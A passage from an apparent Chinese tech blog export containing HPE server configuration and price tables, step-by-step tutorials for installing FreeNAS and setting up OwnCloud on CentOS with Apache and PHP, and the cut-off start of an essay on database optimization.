<td>标配1个HPE嵌入式 S100i SATA阵列控制器, 支持RAID 0/1/5/10</td>
<td>2个 PCIe 3.0插槽; 标配2个热插拔 3.5英寸大尺寸硬盘槽位,最大2个; 实配1块1TB SATA 硬盘</td>
</tr>
<tr>
<td>E-2224 2LFF 标配</td>
<td>7800</td>
<td>标配8GB (1x8GB UDIMM, 2666 MHz)非缓冲内存, 最大支持4个DDR4内存插槽</td>
<td>标配一个Intel Xeon E-2224 (4-Core, 3.4 GHz, 71W)，最大一个</td>
<td>标配1个HPE嵌入式 S100i SATA阵列控制器, 支持RAID 0/1/5/10</td>
<td>标配2个冷插拔 3.5英寸大尺寸硬盘槽位,最大2个; 标配无硬盘;</td>
</tr>
<tr>
<td>E-2224 2LFF 标配</td>
<td>8400</td>
<td>标配8GB (1x8GB UDIMM, 2666 MHz)非缓冲内存, 最大支持4个DDR4内存插槽</td>
<td>标配一个Intel Xeon E-2224 (4-Core, 3.4 GHz, 71W)，最大一个</td>
<td>标配1个HPE嵌入式 S100i SATA阵列控制器, 支持RAID 0/1/5/10</td>
<td>标配2个冷插拔 3.5英寸大尺寸硬盘槽位,最大2个; 实配1块3.5寸1TB SATA 冷插拔硬盘</td>
</tr>
</tbody></table>
<p>HPE DL360 Gen10 服务器系列-1U两路</p>
<p>HPE ProLiant DL360 Gen10服务器就是一款集成了安全、敏捷、弹性并且对性能毫不妥协服务器。支持Intel® Xeon®处理器可扩展系列，性能提升高达71%，内核增加27%，结合HPE DDR4 2666 MT/s智能内存，性能提升多达66%。支持12根永久性内存和10块NVMe SSD所带来的增益使HPE ProLiant DL360 Gen10服务器成为数据中心计算的核心驱动力</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>CTO机型 4214 特配</td>
<td>18320</td>
<td>32GB 2Rx8 PC4-2933Y-R (2x 16 GB)内存，24个内存插槽 最大支持24个DDR4内存插槽</td>
<td>1个Intel Xeon 4214 (2.2GHz/12-core/85W)处理器；可支持最大2个处理器</td>
<td>HPE Smart Array P408i-a/2GB SR Gen10 12Gb SAS 阵列控制器 ；支持RAID 0/1/5/10</td>
<td>标配1块300GB 10K SAS 2.5寸硬盘</td>
</tr>
<tr>
<td>CTO机型 5218 特配</td>
<td>22500</td>
<td>32GB 2Rx8 PC4-2933Y-R (2x 16 GB)内存，24个内存插槽 最大支持24个DDR4内存插槽</td>
<td>1个Intel Xeon 5218 (2.3GHz/16-core/125W) 处理器；可支持最大2个处理器</td>
<td>HPE Smart Array P408i-a/2GB SR Gen10 12Gb SAS 阵列控制器 ；支持RAID 0/1/5/10</td>
<td>标配1块300GB 10K SAS 2.5寸硬盘</td>
</tr>
<tr>
<td>3204 8SFF 标配</td>
<td><strong>11500.00</strong></td>
<td>标配16GB (1x16GB) RDIMM 2R 2933 MT/s内存, 最大支持24个DDR4内存插槽</td>
<td>标配1个英特尔至强Cascade Lake可扩展处理器 Bronze 3204(6核1.9GHz,8.25MB共享三级缓存,85W)可支持最大2个处理器</td>
<td>标配标配1个S100i SATA阵列卡，只支持SATA硬盘，只支持UEFI模式以及Windows操作系统，RAID0,1,5和10</td>
<td>标配8个2.5英寸SFF(Smart Drive)硬盘槽位</td>
</tr>
<tr>
<td>BTO机型 4215R 标配</td>
<td>新品上市</td>
<td>配置 32GB 2Rx4 PC4-2933Y-R (1x32GB)内存，24个内存插槽</td>
<td>标配1颗 Intel Xeon Silver 4215R (8-Core, 3.2 GHz, 130W)处理器，最大2颗；Intel C621芯片</td>
<td>配置嵌入式 HPE Smart Array S100i SR Gen10 SW RAID SATA 控制器</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持10个前置硬盘槽位</td>
</tr>
</tbody></table>
<p>HPE DL388 Gen10 服务器系列-2U两路</p>
<p>HPE ProLiant DL380 Gen10在国内代理商分销的机型命名为HPE DL388 Gen10；当渠道分销的服务器机型与配置无法满足客户需求时，服务器厂商可提供定制服务，工厂定制的机型简称CTO机型，仍采用HPE DL380 Gen10 命名。通常DL388服务器仅提供标准8块2.5寸盘位的机型（可通过选件升级至16或24盘位）；而定制CTO机型即HPE DL380 Gen10 CTO 服务器可提供3.5寸LFF盘位及更高处理器的配置</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>4210 8SFF 标配</td>
<td>12800</td>
<td>配置 16GB 2Rx8 PC4-2933Y-R (1x 16 GB)内存，24个内存插槽</td>
<td>标配1颗 Intel Xeon Silver 4210 (10-Core, 2.2 GHz, 85W)处理器，最大2颗；Intel C621芯片</td>
<td>配置HPE Smart Array P408i-a/2G缓存 SR 12G SAS RAID 控制器带智能存储电池</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>4214 8SFF 标配</td>
<td>16000</td>
<td>配置 16GB 2Rx8 PC4-2933Y-R (1x 16 GB)内存，24个内存插槽</td>
<td>标配1颗 Intel Xeon Silver 4214 (12-Core, 2.2 GHz, 85W)处理器，最大2颗；Intel C621芯片</td>
<td>配置HPE Smart Array P408i-a/2G缓存 SR 12G SAS RAID 控制器带智能存储电池</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>4210R 8SFF 标配</td>
<td>14800</td>
<td>配置 16GB 2Rx8 PC4-2933Y-R (1x 16 GB)内存，24个内存插槽</td>
<td>标配1颗 Intel Xeon Silver 4210R (10-Core, 2.4 GHz, 100W)处理器，最大2颗；Intel C621芯片</td>
<td>配置HPE Smart Array P408i-a/2G缓存 SR 12G SAS RAID 控制器带智能存储电池</td>
<td>配置HPE Smart Array P408i-a/2G缓存 SR 12G SAS RAID 控制器带智能存储电池</td>
</tr>
</tbody></table>
<p>惠普服务器-HPE DL560 Gen10 服务器系列-2U四路</p>
<p>HPE ProLiant DL560 Gen10服务器在2U空间内提供4路的计算密度，支持4颗Intel Xeon铂金 (8100系列) 和黄金 (6100和5100系列) 处理器，处理性能提高达68%，计算内核数量提升27%；48 DIMM插槽支持多达3TB/6TB 2666MT/s DDR4 HPE智能内存。HPE DDR4智能内存可以有效改善工作负载性能和功率效率，同时减少数据丢失和停机时间，并增强错误处理能力</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>CTO平台 8SFF机型</td>
<td>15000</td>
<td>24个DDR4内存插槽，标配无内存，最大支持48个DDR4内存插槽（需要CPU Mezzanine Board Kit）</td>
<td>标配2个Smart Socket 智能CPU托架，支持Intel Xeon Platinum8100或Gold 6100/5100系列处理器，最大支持4个处理器（需要CPU Mezzanine Board）</td>
<td>内置HPE Smart Array S100i SR Gen10 SW 6Gb SATA 阵列控制器</td>
<td>8 个热插拔 SFF热插拔硬盘槽位，标配无硬盘</td>
</tr>
<tr>
<td>BTO机型 5215 8SFF</td>
<td>44500</td>
<td>配置 HPE 64GB 2Rx4 PC4-2933Y-R (2x 32 GB)内存，最多48个内存插槽</td>
<td>标配2颗 Intel Xeon Gold 5215 (10-Core, 2.5 GHz, 85W)处理器，最大4颗；Intel C621芯片</td>
<td>配置嵌入式 HPE Smart Array S100i SR Gen10 SW RAID SATA 控制器</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>BTO机型 5218 8SFF</td>
<td>46500</td>
<td>配置 HPE 64GB 2Rx4 PC4-2933Y-R (2x 32 GB)内存，最多48个内存插槽</td>
<td>标配2颗 Intel Xeon Gold 5218 (16-Core, 2.3 GHz, 125W)处理器，最大4颗；Intel C621芯片</td>
<td>配置嵌入式 HPE Smart Array S100i SR Gen10 SW RAID SATA 控制器</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>BTO机型 5220 8SFF</td>
<td>61000</td>
<td>标配64 GB DDR4-2666 MT/s (4x16 GB)内存内存，最多48个内存插槽</td>
<td>标配2颗 Intel Xeon Gold 5220 (18-Core, 2.2 GHz, 125W)处理器，最大4颗；Intel C621芯片</td>
<td>配置嵌入式 HPE Smart Array S100i SR Gen10 SW RAID SATA 控制器</td>
<td>标配无硬盘，支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>BTO机型 5215 经典配置</td>
<td>87800</td>
<td>配置 HPE 128GB 2Rx4 PC4-2933Y-R (4 x 32 GB)内存，最多48个内存插槽</td>
<td>4颗 Intel Xeon Gold 5215 (10-Core, 2.5 GHz, 85W)处理器，最大4颗；Intel C621芯片</td>
<td>HPE Smart Array P408i-a SR Gen10 (8 Internal Lanes/2GB Cache) 12G SAS Modular LH Controller</td>
<td>1块480GB SSD+3块2.4TB 10K SAS硬盘；支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
<tr>
<td>BTO机型 5218 经典配置</td>
<td>91800</td>
<td>配置 HPE 128GB 2Rx4 PC4-2933Y-R (4 x 32 GB)内存，最多48个内存插槽</td>
<td>4颗 Intel Xeon Gold 5218 (16-Core, 2.3 GHz, 85W)处理器，最大4颗；Intel C621芯片</td>
<td>HPE Smart Array P408i-a SR Gen10 (8 Internal Lanes/2GB Cache) 12G SAS Modular LH Controller</td>
<td>1块480GB SSD+3块2.4TB 10K SAS硬盘；支持8个SFF 热插拔硬盘位，最大支持24个前置硬盘槽位</td>
</tr>
</tbody></table>
<p>HPE DL580 Gen10 服务器系列-4U四路</p>
<p>HPE ProLiant DL580 服务器是一款支持4路CPU 4U高度的机架式服务器，属于企业级服务器，可用于业务关键型工作负载，处理数据库、存储和图形密集型应用程序。最新 HP DL580 Gen10服务器采用性能提升28%的最新Intel®Xeon®可扩展处理器，提供的处理能力远远高于之前几代产品，具有多达6TB的2666MT/s内存，增加多达66%的内存带宽，多达十六个PCIe3.0插槽，外加HPE OneView和HPE iLO 5带来的简洁的自动化管理</p>
<table>
<thead>
<tr>
<th></th>
<th>价格</th>
<th>内存</th>
<th>CPU</th>
<th>RAID</th>
<th>硬盘</th>
</tr>
</thead>
<tbody><tr>
<td>BTO 机型 E7-4820V4</td>
<td>29999</td>
<td>标配2x16GB（32GB) PC4-2400T-R DIMMs (DDR4)内存，最大可扩充至6TB全缓冲DIMMs (DDR4-2400)内存</td>
<td>标配1个Intel 10核Xeon E7-4820 v4处理器(2.0GHz,10-core,25MB 缓存, 115W)，可支持最大4个处理器</td>
<td>内置Smart Array P830i/2GB FBWC阵列控制器</td>
<td>标配5个SFF热插拔硬盘插槽，最多扩展到10个SFF热插拔硬盘,标配无硬盘</td>
</tr>
<tr>
<td>BTO 机型 金牌5220</td>
<td>53800</td>
<td>标配HPE 64GB 2Rx4 PC4-2933Y-R（2x32G）内存，最多48个内存插槽（128GB59800）</td>
<td>标配 2个Intel Xeon Gold 5220 (2.2GHz/18-core/125W)处理器，可支持最大4个处理器</td>
<td>内置HPE Smart Array P408i-p/2G缓存 SR Gen10 12Gb SAS 阵列控制器，带智能存储电池</td>
<td>标配 8个SFF热插拔硬盘插槽，最多扩展到48个SFF热插拔硬盘，标配无硬盘</td>
</tr>
<tr>
<td>BTO 机型 金牌6230</td>
<td>59800</td>
<td>标配HPE 256GB 2Rx4 PC4-2933Y-R（8x32G）内存，最多48个内存插槽</td>
<td>标配 4个Intel Xeon Gold 6230 (2.1GHz/20-core/125W)处理器，可支持最大4个处理器</td>
<td>内置HPE Smart Array P408i-p/2G缓存 SR Gen10 12Gb SAS 阵列控制器，带智能存储电池</td>
<td>标配 8个SFF热插拔硬盘插槽，最多扩展到48个SFF热插拔硬盘，标配无硬盘</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>服务器配置及价格</category>
      </categories>
      <tags>
        <tag>物理服务器配置及价格</tag>
      </tags>
  </entry>
  <entry>
    <title>FreeNAS共享存储服务器的搭建</title>
    <url>/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="FreeNAS共享存储服务器的搭建"><a href="#FreeNAS共享存储服务器的搭建" class="headerlink" title="FreeNAS共享存储服务器的搭建"></a>FreeNAS共享存储服务器的搭建</h1><p>本次搭建：在VMware 虚拟机上安装和配置FreeNAS 11.2，请自行下载所需版本。</p>
<p>【FreeNAS-11.2-RELEASE.iso】</p>
<p>下载地址：<a href="https://download.freenas.org/11.2/STABLE/RELEASE/x64/FreeNAS-11.2-RELEASE.iso" target="_blank" rel="noopener">https://download.freenas.org/11.2/STABLE/RELEASE/x64/FreeNAS-11.2-RELEASE.iso</a></p>
<h2 id="1-1准备一台虚拟机，此处详细步骤略。"><a href="#1-1准备一台虚拟机，此处详细步骤略。" class="headerlink" title="1.1准备一台虚拟机，此处详细步骤略。"></a>1.1准备一台虚拟机，此处详细步骤略。</h2><p>不清楚请先去看centos 6 安装过程详解 只需要把DVD里面的镜像换一下就可以</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175659752.png" alt="image-20200916175659752"></p>
<h2 id="1-2-FreeNAS系统安装"><a href="#1-2-FreeNAS系统安装" class="headerlink" title="1.2 FreeNAS系统安装"></a>1.2 FreeNAS系统安装</h2><h3 id="1-2-1-打开虚拟机电源。"><a href="#1-2-1-打开虚拟机电源。" class="headerlink" title="1.2.1 打开虚拟机电源。"></a>1.2.1 打开虚拟机电源。</h3><p>进入安装界面，敲击回车开始安装。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175718206.png" alt="image-20200916175718206"></p>
<h3 id="1-2-2-选择第一个”Install-Upgrade”，点击OK。"><a href="#1-2-2-选择第一个”Install-Upgrade”，点击OK。" class="headerlink" title="1.2.2 选择第一个”Install/Upgrade”，点击OK。"></a>1.2.2 选择第一个”Install/Upgrade”，点击OK。</h3><p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175729272.png" alt="image-20200916175729272"></p>
<h3 id="1-2-3-提示内存小于8G。"><a href="#1-2-3-提示内存小于8G。" class="headerlink" title="1.2.3 提示内存小于8G。"></a>1.2.3 提示内存小于8G。</h3><p>此处作为虚拟测试，可忽略此项错误提示。直接点击Yes。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175741430.png" alt="image-20200916175741430"></p>
<h3 id="1-2-4-选择安装在哪个磁盘上。"><a href="#1-2-4-选择安装在哪个磁盘上。" class="headerlink" title="1.2.4 选择安装在哪个磁盘上。"></a>1.2.4 选择安装在哪个磁盘上。</h3><p>此处选择20G的磁盘作为系统安装盘。光标上下移动，空格键为选择。然后点击OK。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175754231.png" alt="image-20200916175754231"></p>
<p>1.2.5 此处为警告，告知安装位置及清空磁盘数据。</p>
<h3 id="直接点击OK。"><a href="#直接点击OK。" class="headerlink" title="直接点击OK。"></a>直接点击OK。</h3><p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175806782.png" alt="image-20200916175806782"></p>
<p>1.2.6 设置root的密码。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175818412.png" alt="image-20200916175818412"></p>
<h3 id="1-2-7-选择引导类型。"><a href="#1-2-7-选择引导类型。" class="headerlink" title="1.2.7 选择引导类型。"></a>1.2.7 选择引导类型。</h3><p>此处选择 BIOS 类型。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175830209.png" alt="image-20200916175830209"></p>
<h3 id="1-2-8-开始安装。"><a href="#1-2-8-开始安装。" class="headerlink" title="1.2.8 开始安装。"></a>1.2.8 开始安装。</h3><p>等待一段时间后，即安装完毕。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175843465.png" alt="image-20200916175843465"></p>
<h3 id="1-2-9-安装完毕后，弹出提示告知安装完毕。"><a href="#1-2-9-安装完毕后，弹出提示告知安装完毕。" class="headerlink" title="1.2.9 安装完毕后，弹出提示告知安装完毕。"></a>1.2.9 安装完毕后，弹出提示告知安装完毕。</h3><p>直接点击OK。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175855247.png" alt="image-20200916175855247"></p>
<h3 id="1-2-10-安装完毕后需要重启。"><a href="#1-2-10-安装完毕后需要重启。" class="headerlink" title="1.2.10 安装完毕后需要重启。"></a>1.2.10 安装完毕后需要重启。</h3><p>选择第三个”Reboot System”。点击OK。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175907719.png" alt="image-20200916175907719"></p>
<h3 id="1-2-11-系统在将重启后，继续安装一些组件。"><a href="#1-2-11-系统在将重启后，继续安装一些组件。" class="headerlink" title="1.2.11 系统在将重启后，继续安装一些组件。"></a>1.2.11 系统在将重启后，继续安装一些组件。</h3><p>请等待最终安装完毕。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175918021.png" alt="image-20200916175918021"></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175924151.png" alt="image-20200916175924151"></p>
<h3 id="1-2-12-安装完毕后，如下图。"><a href="#1-2-12-安装完毕后，如下图。" class="headerlink" title="1.2.12 安装完毕后，如下图。"></a>1.2.12 安装完毕后，如下图。</h3><p>参照提示,可根据实际需要去修改配置。</p>
<p>管理地址也已列出。如：<a href="http://192.168.153.230" target="_blank" rel="noopener">http://192.168.153.230</a></p>
<p><img src= "/img/loading.gif" data-src="/2020/10/12/%E6%90%AD%E5%BB%BAFREENAS%E5%85%B1%E4%BA%AB%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20200916175936714.png" alt="image-20200916175936714"></p>
<p>至此，FreeNAS 系统安装完毕。</p>
]]></content>
      <categories>
        <category>FreeNAS</category>
      </categories>
      <tags>
        <tag>FreeNAS</tag>
        <tag>共享存储</tag>
      </tags>
  </entry>
  <entry>
    <title>个人网盘OwnCloud自有云搭建教程</title>
    <url>/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="搭建个人网盘"><a href="#搭建个人网盘" class="headerlink" title="搭建个人网盘"></a>搭建个人网盘</h1><h2 id="1-找包"><a href="#1-找包" class="headerlink" title="1.找包"></a>1.找包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. rpm --import https://download.owncloud.org/download/repositories/10.0/CentOS_7/repodata/repomd.xml.key</span><br><span class="line"></span><br><span class="line">2. wget http://download.owncloud.org/download/repositories/10.0/CentOS_7/ce:10.0.repo -O /etc/yum.repos.d/ce:10.0.repo</span><br></pre></td></tr></table></figure>



<h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install owncloud-files -y</span></span><br></pre></td></tr></table></figure>

<p>检查是否安装成功</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203313878.png" alt="image-20200817203313878"></p>
<h2 id="3-安装Apache并启动"><a href="#3-安装Apache并启动" class="headerlink" title="3.安装Apache并启动"></a>3.安装Apache并启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum install httpd  –y</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start httpd &amp;&amp; systemctl <span class="built_in">enable</span> httpd</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203325978.png" alt="image-20200817203325978"></p>
<h2 id="4-添加OwnCloud配置"><a href="#4-添加OwnCloud配置" class="headerlink" title="4.添加OwnCloud配置"></a>4.添加OwnCloud配置</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/httpd/conf/httpd.conf</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203343373.png" alt="image-20200817203343373"></p>
<p>配置如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">owncloud config</span></span><br><span class="line">Alias /owncloud "/var/www/html/owncloud/"</span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">   Options +FollowSymlinks</span><br><span class="line">   AllowOverride ALL</span><br><span class="line">   &lt;IfModule mod_dav.c&gt;</span><br><span class="line">       Dav off</span><br><span class="line">   &lt;/IfModule&gt;</span><br><span class="line">   SetEnv HOME /var/www/html/owncloud</span><br><span class="line">   SetEnv HTTP_HOME /var/www/html/owncloud</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>

<h2 id="5-安装配置php"><a href="#5-安装配置php" class="headerlink" title="5.安装配置php"></a>5.安装配置php</h2><h3 id="1-配置源"><a href="#1-配置源" class="headerlink" title="1.配置源"></a>1.配置源</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm   </span></span><br><span class="line"><span class="meta">#</span><span class="bash">rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span></span><br></pre></td></tr></table></figure>

<h3 id="2-执行以下命令安装PHP-7-2版本。"><a href="#2-执行以下命令安装PHP-7-2版本。" class="headerlink" title="2.执行以下命令安装PHP 7.2版本。"></a>2.执行以下命令安装PHP 7.2版本。</h3><p>说明：OwnCloud只支持PHP 5.6以上的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> yum -y install php72w</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y install php72w-cli php72w-common php72w-devel php72w-mysql php72w-xml php72w-odbc php72w-gd php72w-intl php72w-mbstring</span></span><br></pre></td></tr></table></figure>

<h3 id="3-检测是否安装成功"><a href="#3-检测是否安装成功" class="headerlink" title="3.检测是否安装成功"></a>3.检测是否安装成功</h3><p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203437566.png" alt="image-20200817203437566"></p>
<h3 id="4配置php到apache中"><a href="#4配置php到apache中" class="headerlink" title="4配置php到apache中"></a>4配置php到apache中</h3><p>插入一行</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203448475.png" alt="image-20200817203448475"></p>
<p>配置如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PHPIniDir  /etc/php.ini</span><br></pre></td></tr></table></figure>

<h3 id="5-重启apache"><a href="#5-重启apache" class="headerlink" title="5.重启apache"></a>5.重启apache</h3><h2 id="6-浏览器进入测试"><a href="#6-浏览器进入测试" class="headerlink" title="6.浏览器进入测试"></a>6.浏览器进入测试</h2><p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203517737.png" alt="image-20200817203517737"></p>
<h2 id="7-配置及结果"><a href="#7-配置及结果" class="headerlink" title="7.配置及结果"></a>7.配置及结果</h2><p>账号密码自定义</p>
<p>数据存放目录有标记</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203532234.png" alt="image-20200817203532234"></p>
<p>最后结果：</p>
<p><img src= "/img/loading.gif" data-src="/2018/12/07/%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98OwnCloud%E7%A7%81%E6%9C%89%E4%BA%91/image-20200817203543678.png" alt="image-20200817203543678"></p>
<p>这里是简易版，没有使用mysql数据库 用的mariadb，所以没有配置数据库</p>
<p>访问地址：<a href="http://10.8.156.106/owncloud/index.php/apps/files/?dir=/&amp;fileid=3" target="_blank" rel="noopener">http://10.8.156.106/owncloud/index.php/apps/files/?dir=/&amp;fileid=3</a></p>
<p>记得把这里的IP改成你自己的IP</p>
<p>账号：admin</p>
<p>密码：admin</p>
]]></content>
      <categories>
        <category>OwnCloud</category>
      </categories>
      <tags>
        <tag>OwnCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库优化</title>
    <url>/2019/06/20/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、优化部分"><a href="#一、优化部分" class="headerlink" title="一、优化部分"></a>一、优化部分</h3><ul>
<li>优化哲学：<ul>
<li>宁放过，不杀错</li>
<li>不为了优化而进行优化</li>
</ul>
</li>
</ul>
<h3 id="二、优化场景"><a href="#二、优化场景" class="headerlink" title="二、优化场景"></a>二、优化场景</h3><blockquote>
<p>我们不是经常会在一个新的环境进行优化，很多情况下，我们优化的对象可能是一个已经在生产中的，十分复杂的集群环境。</p>
</blockquote>
<h5 id="优化可能带来的问题"><a href="#优化可能带来的问题" class="headerlink" title="优化可能带来的问题"></a>优化可能带来的问题</h5><ul>
<li>优化行为本来就是一个不常规的操作，他可能会给你的集群带来很多的问题，所以，什么时候优化，优化之后会有什么样的后果，这需要你对于相关技术和业务需求有着很深的了解。</li>
<li>不计后果的优化，带来的往往是从一个点出现的问题延伸到服务的各个角落，形成蝴蝶效应，且行且谨慎。</li>
<li>越极致的优化失败的概率越大，什么是失败的优化，失败就是没有改变服务的现状或者让其更加差劲。</li>
</ul>
<h5 id="什么时候需要优化"><a href="#什么时候需要优化" class="headerlink" title="什么时候需要优化"></a>什么时候需要优化</h5><ul>
<li>优化操作的理念是又叫马儿跑，又叫马儿不吃草，以更少的资源，做更多的事情，在考虑成本的情况下，让现有资源能承载更高的负载。所以，在服务比较稳定，没有优化需求的情况下，不要进行任何优化操作。</li>
